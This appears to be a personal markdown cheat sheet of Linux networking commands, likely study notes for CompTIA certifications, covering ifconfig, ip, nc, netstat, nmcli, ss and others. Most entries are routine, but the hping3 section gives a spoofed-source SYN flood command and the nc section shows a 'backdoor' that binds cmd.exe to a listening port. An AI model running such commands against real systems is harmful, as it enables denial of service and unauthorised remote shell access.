# Linux network commands
&nbsp;  | Commands
---     | ---
&nbsp;  | [`bmon`][bmon] &bull; [`hping3`][hping3] &bull; [`ifconfig`][ifconfig] [`ip`][ip] [`iw`][iw] [`iwlist`][iwlist] &bull; [`nc`][nc] [`netstat`][netstat] [`nmcli`][nmcli] &bull; [`rfkill`][rfkill] &bull; [`ss`][ss]
### `bmon`
[^][https://www.networkworld.com/video/99387/how-to-use-the-bmon-command-2-minute-linux-tips] [^][https://www.networkworld.com/article/3447936/viewing-network-bandwidth-usage-with-bmon.html]
### `hping3`
Hping3 crafts "SYN" (sequence) packets from random spoofed IP addresses and sends them out at very short intervals. [^][Sec+ Lab]

Option  | POSIX option            | Effect [^][https://tools.kali.org/information-gathering/hping3]
:---    | :---                    | :---
`-i`    | `--interval`            | wait for specified number of microseconds
`-p`    | `--destport`            | destination port 
`-q`    | `--quiet`               | quiet
`-S`    | `--baseport`            | base source port (default random)
&nbsp;  | `--rand-source`         | random source address mode

```sh
hping3 192.168.0.2 -p 80 -i u10 -S -q --rand-source
```
### `ifconfig`
"RX" and "TX" stand for received and transmitted.

Apply a static IP address to interface {eth0} and turn it on ("up")
```
ifconfig eth0 up 10.1.230.245 netmask 255.255.255.0
```
Bring an interface up or down
```
ifup eth0
ifdown eth0
```
```
ifconfig eth0 up
ifconfig eth0 down
```
Display details of all interfaces (even disabled)
```sh
ifconfig -a
```
Disable eth0
```sh
ifconfig eth0 down
```
Configure eth0 with an additional IPv6 address
```sh
ifconfig eth0 inet6 add fdd6:551:b09e::/128
```
Enable eth0
```sh
ifconfig eth0 up
```
Turn network interface {eth0} on or off using `ifconfig`
```sh
ifconfig eth0 up
ifconfig eth0 down
```
Turn off network interface {eth0}
```sh
ifdown eth0
```
Bring online all interfaces marked as auto within the networking configuration
```sh
ifup -a
```
Turn on network interface {eth0}
```sh
ifup eth0
```
### `ip`
Newer alternative to the old `ifconfig`
```sh
ip addr
```
Show L2 status (links)
```sh
ip link
```
Listen for netlink messages
```sh
ip monitor 
```
Display routing information
```sh
ip route
```
Change the default gateway to 192.168.1.1 on eth0
```sh
ip route change default via 192.168.1.1 dev eth0
```

Turn on interface `wlp2s0`
```sh
sudo ip link set wlp2s0 up
```
### `iw`
Show or manipulate wireless devices and their configuration; followed by `dev`, `phy`, or `reg` depending on the device.\
Check the name of network device [[59](sources.md)]
```sh
iw dev
```
Check the connecdtion status of the Wi-Fi device `wlp2s0`
```sh
iw wlp2s0 link
```
### `iwlist`
### `nc`
The netcat utility allows testing of a host's ports, similar to __ping__, but more versatile because __ping__ only uses the portless ICMP protocol. GNU and OpenBSD versions available (itp-l+: 28)

Option  | Effect
:---    | :---
`-l`    | listening mode

Connect to host on port 80
```
nc example.com 80
```
Scan ports
```
# Scan a single port
nc -v -w 2 z 192.168.56.1 22

# Scan multiple ports
nc -v -w 2 z 192.168.56.1 22 80

# Scan a range of ports
nc -v -w 2 z 192.168.56.1 22-25
```
Transfer files between servers
This example uses the `pv` utility to monitor progress.
```
# Run `nc` in listening mode (`-l` option) on port 3000
tar -zcf - debian-10.0.0-amd64-xfce-CD-1.iso | pv | nc -l -p 3000 -q 5

# On the receiving client, to obtain the file:
nc 192.168.1.4 3000 | pv | tar -zxf -
```
Create a command-line chat server
```
# Create chat server listening on port 5000
nc -l -vv -p 5000

# Launch a chat session on the other system
nc 192.168.56.1 5000
```
Find a service running on port
Obtain port banners (`-n` disables DNS lookup)
```
nc -v -n 192.168.56.110 80
```
Create stream sockets
Create and listen on a UNIX-domain stream socket
```
nc -lU /var/tmp/mysocket &
ss -lpn | grep "/var/tmp/"
```
Create a backdoor
Netcat needs to listen on a chosen port (here 3001): `-d` disables reading from stdin; `-e` specifies the command to run on the target system
```
nc -L -p 3001 -d -e cmd.exe
```
Connect to {port} at {host}
```sh
nc host port
```
Netcat command that retrieves a webpage
```sh
nc host port \get
```
### `netstat`
Option  | POSIX option            | Effect
:---    | :---                    | :---
`-a`    | `--all` | display both listening and non-listening sockets
`-c`    | `--continuous` | display selected information every second continuously
`-e`    | `--extend` | display additional information (repeat for maximum detail)
`-g`    | `--groups` | display multicast group membership information for IPv4 and IPv6
`-i`    | `--interfaces` | display a table of all network interfaces
`-l`    | `--listening` | display only listening sockets
`-M`    | `--masquerade` | display masqueraded connections
`-n`    | `--numeric` | display numerical addresses instead of symbolic host, port, or user names
`-o`    | `--timers` | display information related to networking timers
`-p`    | `--program` | display PID and name of program to which each socket belongs
`-r`    | `--route` | display routing tables
`-s`    | `--statistics` | display summary statistics by protocol
Show network traffic
```sh
netstat -an
```
Refresh every five seconds
```sh
netstat -c5
``` 
Show the current default route without performing DNS lookups on the IP addresses involved
```sh
netstat -rn
```
Count number of TCP connections 
```
netstat -a | grep tcp - | wc -l
``` 
Active sessions 
```
netstat -tp
``` 
All sessions
```
netstat -atp
``` 
Routing table with name resolution 
```
netstat -rn
``` 
Get the list of IPs and ports that are connected via https on your webserver every second
```
watch -n 1 'netstat -an | grep ":443"'
``` 
Get the total number of connections on port 80 every second
```
watch -n 1 'netstat -an | grep ":80" | wc -l'
```
### `nmcli`
Control NetworkManager and report network status

Display devices and statuses
```
nmcli device status
```

Display information on interfaces as well as status
Including other network connections not managed by network manager ("unmanaged") or not connected ("unavailable") 
```
nmcli dev status
```
Display what connections are enabled 
```
nmcli general status
```
Display UUIDs associated with network connections 
```
nmcli connection show --active
```
Display much more information on network devices
```
nmcli device show
```
Configure settings for network interface {ens01} via interactive shell
```sh
nmcli connection edit ens01
```
List all connections NetworkManager has
```sh
nmcli connection show
```
Show settings for network interface {ens01}
```sh
nmcli device show ens01
```
Show status for all devices
```sh
nmcli device status
```
Display devices and status
```sh
nmcli device status
```
Display currently configured hostname
```sh
nmcli general hostname
```
Set hostname to {hostname}
```sh
nmcli general hostname hostname
```
Show overall status of NetworkManager
```sh
nmcli general status
```
### `rfkill`
Tool for enabling and disabling wireless devices

Command | Effect
---     | ---
`block` | disable specified device
`list`  | List the current state of all available rfkill-using devices [[59](sources.md)]
`unblock`| enable specified device [[59](sources.md)]

Unblock Bluetooth, if it is blocked [^][https://computingforgeeks.com/connect-to-bluetooth-device-from-linux-terminal/]
```sh
rfkill unblock bluetooth
```
### `ss`
"Socket statistics", successor to __netstat__. 

Options are of two kinds:
1. Connection type (listening or established)
2. Protocol type

Option  | POSIX option            | Effect
:---    | :---                    | :---
`-l`    | `--listening`           | display sockets that are listening
`-a`    | `--all`                 | display both listening sockets and established connections
`-t`    | `--tcp`                 | display TCP sockets
`-u`    | `--udp`                 | display UDP sockets
`-x`    | `--unix`                | display Unix domain sockets
Display port numbers instead of protocol names
```
ss -n
```
```
ss --numeric
```
Do __name__ lookups and display __all__ information
```
ss -an
```
Display all active TCP sessions
```
ss -atp
```
Display active TCP sessions
```
ss -tp
```
Display routing table (cf. `ip route`)
```
ss --route
```
Display programs with open ports 
```
ss --program
```
Show all running servers 
"Tuna please"
```
ss -tunapl
```
Do name lookups and display all information
```sh
ss -an
ss --all --numeric
```
Display all sessions, filtering to just TCP that are actively listening
```sh
ss -atp
ss --all --tcp --processes
```
Display active TCP connections
```sh
ss -tp
ss --tcp --processes
```

## 
[Sec+ Lab]: https://pts.measureup.com/web/index.php#dashboard.php "Practice Lab: CompTIA Security+ (SY0-501)"
[https://tools.kali.org/information-gathering/hping3]: https://tools.kali.org/information-gathering/hping3 "tools.kali.org: \"hping3 - Active Network Smashing Tool\""
[https://computingforgeeks.com/connect-to-bluetooth-device-from-linux-terminal/]: https://computingforgeeks.com/connect-to-bluetooth-device-from-linux-terminal/ "Computing for Geeks: \"How to connect to Bluetooth device from Linux terminal\""
[https://www.networkworld.com/article/3447936/viewing-network-bandwidth-usage-with-bmon.html]: https://www.networkworld.com/article/3447936/viewing-network-bandwidth-usage-with-bmon.html "Network World: \"Viewing network bandwidth usage with bmon\""
[https://www.networkworld.com/video/99387/how-to-use-the-bmon-command-2-minute-linux-tips]: https://www.networkworld.com/video/99387/how-to-use-the-bmon-command-2-minute-linux-tips "Network World: How to use the bmon command: 2-Minute Linux Tips"

[bmon]:                                              #bmon                                    '```&#10;$ bmon&#10;```&#10;Terminal-based graphical bandwidth monitor'
[hping3]:                                            #hping3                                  '```&#10;$ hping3&#10;```&#10;Active network smashing tool'
[ip]:                                                #ip                                                '```&#10;ip&#10;```&#10;Newer alternative to the old `ifconfig`&#10;Rothwell, William. _CompTIA Linux+ Portable Command Guide_.'
[ifconfig]:                                          #ifconfig                                          '```&#10;$ ifconfig&#10;```&#10;Obsolete program that configures network interfaces'
[rfkill]:                                            #rfkill                                  '```&#10;$ rfkill&#10;```&#10;Tool for enabling and disabling wireless devices'